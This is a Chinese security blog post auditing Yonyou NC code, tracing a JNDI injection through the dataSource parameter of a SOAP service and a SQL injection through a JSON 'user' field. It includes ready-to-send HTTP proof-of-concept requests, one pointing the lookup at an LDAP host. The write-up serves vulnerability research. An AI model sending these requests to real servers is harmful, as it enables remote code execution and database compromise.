

<!DOCTYPE html>
<html lang="" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="审计记录">
<meta property="og:type" content="article">
<meta property="og:title" content="用友的一处jndi及sql注入审计">
<meta property="og:url" content="http://novysodope.github.io/2022/12/10/96/index.html">
<meta property="og:site_name" content="novy&#39;s Blog">
<meta property="og:description" content="审计记录">
<meta property="og:locale">
<meta property="og:image" content="http://novysodope.github.io/images/96/NLZFvtE9Ujoc0dnLa1QU3-XCqcGP-8xxxRPbQE3h6Qs.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/cm1eEWt-QuN0i9E4NTMsK7qqFLO1aulaqsWd6w_a_6A.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/AawF3bV5P9fXQEmoON8kTH1m90zDNm3xGxkaCy-3ELE.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/sKVwoJ3HQ8G0Sa6JI2LP478qJYTvGW_yDMYKQcrPBag.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/PLMzZmcIIUOQK7UuVs4nhBqnqBOh3me93IMRVdrMTWE.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/tAiRVHjEg0oQDBNIpExi9Dj-hA8VbOHbDEnxgsabQ1A.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/bZMYlzjEjrcWpJBMVeHjRp_xU0VCU-JjK7G13ZwezjY.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/s93dUFpE0DLEDXR3OtdHp6Zo_LC4sfuufkpfgAXNN6g.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/cbPkwzGkrw51gnk-EAtwa3QYlYJzmMtgULP8RHBP5eQ.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/0b0Y_n_-vFhaNp1N09A2ZyrIcbZ4VBMbdzKAdSMi8k.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/iQQRXcRBV4zzZwoB6K0_sStnwgmuWw9BGKIUhfmhuyk.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/rmsiOnu9xeC9CbFXBOb7E22BUZRXFxXf4cjZh2hVWBE.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/PZfbEN6Bj0oFpWm6Y82plzIRWZZ1-4gr2rPCXpFZTEg.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/S0kZCjM8rFXg2Xcf1OB_azcEugKCPLxF_RJn-6ggfJ4.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/QnAj706QqxGvPMg5ppa2QbzMendklnHB4hibqxN2EPM.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/fZGtxVS27BJ3tVtMBOzBwRVpeEYFY78ECeLSH1Ks4bM.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/tVlT6rDWcPiRtbL7-yJALzOAEesjENlFLvaKtMfGQ-I.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/Ylqdwfoo5L9geY2f2IPxh2R3RgRsoHirX-EAkNK2tUk.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/rGl0tjDKZLTqV_bx0-LJeHo_0uq7rywyr90j3xJ8P9o.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/eNtZQOivtH7vOFvAY1WCpFrqnqO6i5VQninlDwbdLc.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/sHEqIi5EcxAQMEeWuNxL6Mmrr3w8Qew9bXZJrakwmpQ.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/hZZTEL-MEXvcrcK8WsdIvqqHeuRRwvtwa7jU5WBIziE.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/xtFfPKCOQdbMLvByGVQmGGe_OxbF2UvQvV0dyKq_lhQ.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/aQ-urOnP5ENn9bVw6TkfOc7ecrPgn7NKvW3FVbNuChw.png">
<meta property="og:image" content="http://novysodope.github.io/images/96/Dhk0Z_1VJvA3OVAAim6zTZL0YzfLJWUOxRKfY8iDoJs.png">
<meta property="article:published_time" content="2022-12-10T05:15:21.000Z">
<meta property="article:modified_time" content="2024-09-22T10:18:30.296Z">
<meta property="article:author" content="novy">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://novysodope.github.io/images/96/NLZFvtE9Ujoc0dnLa1QU3-XCqcGP-8xxxRPbQE3h6Qs.png">
  
  <title>用友的一处jndi及sql注入审计 - novy&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  



<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6,h7,h8,h9","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ZyJbAKYmfgJXZGNkDKKBRC0i-gzGzoHsz","app_key":"WXTmIgfHD2JkbhooWMtgYW3C","server_url":"https://zyjbakym.lc-cn-n1-shared.com","path":"window.location.pathname"}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.2"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>novy&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友情链接
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="用友的一处jndi及sql注入审计">
              
            </span>

            
              <div class="mt-3">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-author" aria-hidden="true"></i>
      novy
    </span>
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-12-10 13:15" pubdate>
        December 10, 2022 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3.6k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      11 分钟
    </span>
  

  
  
    

      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="leancloud-page-views"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">用友的一处jndi及sql注入审计</h1>
            
            <div class="markdown-body">
              <p>首先查看其中一个模块的映射配置</p>
<p><img src="/images/96/NLZFvtE9Ujoc0dnLa1QU3-XCqcGP-8xxxRPbQE3h6Qs.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>经分析，这里所有的映射均可利用，以<code>SoapRequestAction</code>类为例</p>
<p><img src="/images/96/cm1eEWt-QuN0i9E4NTMsK7qqFLO1aulaqsWd6w_a_6A.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>首先查看<code>SoapRequestAction</code>的流程，在<code>execuse</code>方法中获取了两个参数，<code>ws</code>、<code>soap</code></p>
<p><img src="/images/96/AawF3bV5P9fXQEmoON8kTH1m90zDNm3xGxkaCy-3ELE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>然后将两个参数传进<code>sendRequest</code>方法，在<code>sendRequest</code>方法中，会根据传进的<code>ws</code>参数去查找对应的soap接口服务</p>
<p><img src="/images/96/sKVwoJ3HQ8G0Sa6JI2LP478qJYTvGW_yDMYKQcrPBag.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>传进来的soap参数则作为soap接口参数来进行请求</p>
<p><img src="/images/96/PLMzZmcIIUOQK7UuVs4nhBqnqBOh3me93IMRVdrMTWE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>从上面流程得知这是一个soap服务</p>
<p>参数表现为：</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ws=webservice接口&amp;soap=webservice接口参数<br></code></pre></div></td></tr></table></figure>
<p> </p>
<p>接下来查找可以利用的webservice接口</p>
<p>在<code>IMsgCenterWebService.wsdl</code>接口文档中，存在很多个字符串参数<code>dataSource</code>，根据字面意思，假设他存在一个数据源连接功能</p>
<p><img src="/images/96/tAiRVHjEg0oQDBNIpExi9Dj-hA8VbOHbDEnxgsabQ1A.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>需要跟进相应方法查看参数是否真的是数据源连接功能，能不能用作jdbc反序列化</p>
<p>根据接口文档名称，得到接口类<code>nc.itf.msgcenter.IMsgCenterWebService</code>，我们以<code>uploadAttachment</code>方法为例跟进</p>
<p><img src="/images/96/bZMYlzjEjrcWpJBMVeHjRp_xU0VCU-JjK7G13ZwezjY.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>图中接口对应的实现类为</p>
<p><code>MsgCenterWebServiceImpl.class</code></p>
<p>在该实现类的<code>uploadAttachment</code>方法中又调用<code>IMsgCenterService</code>接口的实现</p>
<p><img src="/images/96/s93dUFpE0DLEDXR3OtdHp6Zo_LC4sfuufkpfgAXNN6g.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>查看<code>IMsgCenterService</code>接口</p>
<p><img src="/images/96/cbPkwzGkrw51gnk-EAtwa3QYlYJzmMtgULP8RHBP5eQ.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>对应的实现类</p>
<p><code>MsgCenterServiceImpl.class</code></p>
<p>在<code>uploadAttachment</code>方法中，会将我们前面注意到的<code>dataSource</code>等参数传进<code>resetInvacationInfoByMsgID</code>方法做处理</p>
<p><img src="/images/96/0b0Y_n_-vFhaNp1N09A2ZyrIcbZ4VBMbdzKAdSMi8k.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>跟进<code>resetInvacationInfoByMsgID</code>方法，参数传进来后，首先是做了一个初始化。具体为：将参数<code>dataSource</code>设置为<code>UserDataSource</code>的值，以供后面的流程调用</p>
<p><img src="/images/96/iQQRXcRBV4zzZwoB6K0_sStnwgmuWw9BGKIUhfmhuyk.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>另一个传进的参数<code>pk_sourcemsg</code>则是传进<code>retrieveByPK</code>方法做查询</p>
<p><img src="/images/96/rmsiOnu9xeC9CbFXBOb7E22BUZRXFxXf4cjZh2hVWBE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>继续跟进流程</p>
<p><code>BaseDAO.class</code></p>
<p>在<code>retrieveByPK</code>方法中，封装了一个<code>manager</code>对象，这里的<code>dataSource</code>是上面说到设置的<code>UserDataSource</code>值，即传进的参数<code>dataSource</code></p>
<p><img src="/images/96/PZfbEN6Bj0oFpWm6Y82plzIRWZZ1-4gr2rPCXpFZTEg.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>跟进<code>createPersistenceManager</code>方法</p>
<p><img src="/images/96/S0kZCjM8rFXg2Xcf1OB_azcEugKCPLxF_RJn-6ggfJ4.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><code>PersistenceManager.getInstance</code>返回的是他的子类<code>JdbcPersistenceManager</code></p>
<p><img src="/images/96/QnAj706QqxGvPMg5ppa2QbzMendklnHB4hibqxN2EPM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>所以跟进<code>JdbcPersistenceManager</code></p>
<p><code>JdbcPersistenceManager.class</code></p>
<p>在<code>JdbcPersistenceManager</code>对象中做了一次初始化，此时的<code>dataSource</code>就是传进的参数<code>dataSource</code></p>
<p><img src="/images/96/fZGtxVS27BJ3tVtMBOzBwRVpeEYFY78ECeLSH1Ks4bM.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>接着进入到<code>init</code>方法，在<code>init</code>方法中，又使用<code>JdbcSession</code>对象来处理<code>dataSource</code></p>
<p><img src="/images/96/tVlT6rDWcPiRtbL7-yJALzOAEesjENlFLvaKtMfGQ-I.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>查看<code>JdbcSession.class</code></p>
<p>在构造函数<code>JdbcSession</code>里对<code>dataSource</code>进行连接</p>
<p><img src="/images/96/Ylqdwfoo5L9geY2f2IPxh2R3RgRsoHirX-EAkNK2tUk.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>具体看<code>getConnection</code>方法：</p>
<p><img src="/images/96/rGl0tjDKZLTqV_bx0-LJeHo_0uq7rywyr90j3xJ8P9o.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>往下就是触发流程了</p>
<p><code>DataSourceCenter.class</code></p>
<p>变量<code>name</code>是传进的参数<code>dataSource</code>，在<code>DataSourceCenter.getConnection</code>方法中将参数传递到<code>Context.lookup</code>，到这里就可以确定这是一个jndi注入了，与JDBC反序列化无瓜</p>
<p><img src="/images/96/eNtZQOivtH7vOFvAY1WCpFrqnqO6i5VQninlDwbdLc.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p><img src="/images/96/sHEqIi5EcxAQMEeWuNxL6Mmrr3w8Qew9bXZJrakwmpQ.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>验证：</p>
<p>根据<code>IMsgCenterWebService.wsdl</code>接口文档构造<code>soap</code>参数</p>
<p> </p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">POST /uapws/soapRequest.ajax HTTP/<span class="hljs-number">1.1</span><br>Host: <br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">107.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">107.0</span><br>Accept: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">Content-Length: 783</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"> </span><br><span class="hljs-comment">ws=nc.itf.msgcenter.IMsgCenterWebService&amp;soap=&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;env:Envelop xmlns:env=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:sn=&quot;http://msgcenter.itf.nc/IMsgCenterWebService&quot;&gt;</span><br><span class="hljs-comment">  &lt;env:Header/&gt;</span><br><span class="hljs-comment">  &lt;env:Body&gt;</span><br><span class="hljs-comment">    &lt;sn:uploadAttachment&gt;</span><br><span class="hljs-comment">      &lt;dataSource&gt;ldap://0.0.0.0:1389/Test&lt;/dataSource&gt;</span><br><span class="hljs-comment">      &lt;msgtype&gt;?&lt;/msgtype&gt;</span><br><span class="hljs-comment">      &lt;pk_sourcemsg&gt;?&lt;/pk_sourcemsg&gt;</span><br><span class="hljs-comment">      &lt;filename&gt;?&lt;/filename&gt;</span><br><span class="hljs-comment">      &lt;file&gt;?&lt;/file&gt;</span><br><span class="hljs-comment">    &lt;/sn:uploadAttachment&gt;</span><br><span class="hljs-comment">  &lt;/env:Body&gt;</span><br><span class="hljs-comment">&lt;/env:Envelop&gt;</span><br></code></pre></div></td></tr></table></figure>
<p><img src="/images/96/hZZTEL-MEXvcrcK8WsdIvqqHeuRRwvtwa7jU5WBIziE.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>最后：</p>
<p>在审计时一度以为这是一个jdbc反序列化，给人错觉的地方太多了，好在最后验证时成功了，且报错的内容与过程看到的一致</p>
<p>最后的最后：</p>
<p>这个接口里还有个紧急注入，不修就倒闭：<code>MsgCenterServiceImpl</code></p>
<p>参数拼接：</p>
<p><img src="/images/96/xtFfPKCOQdbMLvByGVQmGGe_OxbF2UvQvV0dyKq_lhQ.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>这个方法由这里调用</p>
<p><img src="/images/96/aQ-urOnP5ENn9bVw6TkfOc7ecrPgn7NKvW3FVbNuChw.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<p>根据代码可以看到这里参数必须是json格式，只需要<code>pk_sourcemsg</code>参数为空就可以进入else流程，造成注入</p>
<p>这个方法最终由这里调用</p>
<p><img src="/images/96/Dhk0Z_1VJvA3OVAAim6zTZL0YzfLJWUOxRKfY8iDoJs.png" srcset="/img/loading.gif" lazyload alt="image"></p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">POST /uapws/soapRequest.ajax HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8023</span><br>Content-Type: application/x-www-form-urlencoded<br>X-Requested-With: XMLHttpRequest<br>Content-Length: <span class="hljs-number">457</span><br>Connection: close<br>ws=nc.itf.msgcenter.IMsgCenterWebService&amp;soap=&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;&lt;env:Envelop xmlns:env=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> xmlns:sn=<span class="hljs-string">&quot;http://msgcenter.itf.nc/IMsgCenterWebService&quot;</span>&gt;<br>&lt;env:Header/&gt;<br>&lt;env:Body&gt;<br>&lt;sn:doAction&gt;<br>&lt;dataSource&gt;这里需要有数据源地址才能进行下面的注入，嘻嘻&lt;/dataSource&gt;<br>&lt;actionCode&gt;这些参数随便填，我直接?&lt;/actionCode&gt;<br>&lt;pluginType&gt;这些参数随便填，我直接?&lt;/pluginType&gt;<br><span class="hljs-comment">//这里就是注入点，pk_sourcemsg为空就可以注入user的值，继续跟进你们会发现，如果注入参数是order开头，那场景就是 sql = sql + &quot; &quot; + condition; 否则就是 sql = sql + &quot; WHERE &quot; + condition;</span><br>&lt;param&gt;&#123;&quot;pk_sourcemsg&quot;:&quot;&quot;,&quot;user&quot;:&quot;注入点&quot;&#125;&lt;/param&gt;<br>&lt;/sn:doAction&gt;<br>&lt;/env:Body&gt;<br>&lt;/env:Envelop&gt;<br></code></pre></div></td></tr></table></figure>


<p> </p>
<p> </p>
<p> </p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">

                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                    
                  </div>
                
              </div>
              <hr>
              <script src="https://utteranc.es/client.js"
        repo="novysodope/novysodope.github.io"
        issue-term="title"
        label="Comment"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
<hr>
              
                <p class="note note-warning">
                  
                    声明：<br>   本文章用于学习交流，严禁用于非法操作，出现后果一切自行承担，阅读此文章表示你已同意本声明。<br> <br> Disclaimer: <br>   This article is for study and communication. It is strictly forbidden to use it for illegal operations. All consequences shall be borne by yourself. Reading this article means that you have agreed to this statement.
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/01/18/94/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">2020代码审计总结（2022修改版_代码审计快速入门）</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/12/09/97/">
                        <span class="hidden-mobile">反序列化随手</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>


            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-x-md">
    <div class="container custom post-custom mx-auto">
      <img src="/img/aa.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;"><p></p> <p style="text-align:center"><span>扫一扫关注我们</span></p>
    </div>
  </div>


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     © 2018-<script type="text/javascript">document.write(new Date().getFullYear());</script> <span> <a href="#" target="_blank" rel="nofollow noopener"><font color="#2ca6cb">novy`s Blog</font>.</a> </span> Powered by <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span><font color="#2ca6cb">Hexo</font></span></a><p><script> function secondToDate(second) { if (!second) { return 0; } var time = new Array(0, 0, 0, 0, 0); if (second >= 365 * 24 * 3600) { time[0] = parseInt(second / (365 * 24 * 3600)); second %= 365 * 24 * 3600; } if (second >= 24 * 3600) { time[1] = parseInt(second / (24 * 3600)); second %= 24 * 3600; } if (second >= 3600) { time[2] = parseInt(second / 3600); second %= 3600; } if (second >= 60) { time[3] = parseInt(second / 60); second %= 60; } if (second > 0) { time[4] = second; } return time; }</script> <script type="text/javascript" language="javascript"> function setTime() { var create_time = Math.round(new Date(Date.UTC(2018, 11, 09, 6, 6, 6)).getTime() / 1000); var timestamp = Math.round((new Date().getTime() + 8 * 60 * 60 * 1000) / 1000); currentTime = secondToDate((timestamp - create_time)); currentTimeHtml = currentTime[0] + "年" + currentTime[1] + "天" + currentTime[2] + "时" + currentTime[3] + "分" + currentTime[4] + "秒"; document.getElementById("htmer_time").innerHTML = currentTimeHtml; }    setInterval(setTime, 1000);</script> 本博客已经稳定运行：<span id="htmer_time" style="color: #2ca6cb;"></span> <br/> <script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

你是第<font color="#2ca6cb"><span id="busuanzi_value_site_uv"></span></font>个小伙伴 </p> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  




  <script defer src="/js/leancloud.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  
    <!-- Baidu Analytics -->
    <script defer>
      var _hmt = _hmt || [];
      (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?a6c1581442f57290135c4581f8de49ff";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
      })();
    </script>
  

  

  

  

  

  






<script  src="/js/boot.js" ></script>


</body>
</html>
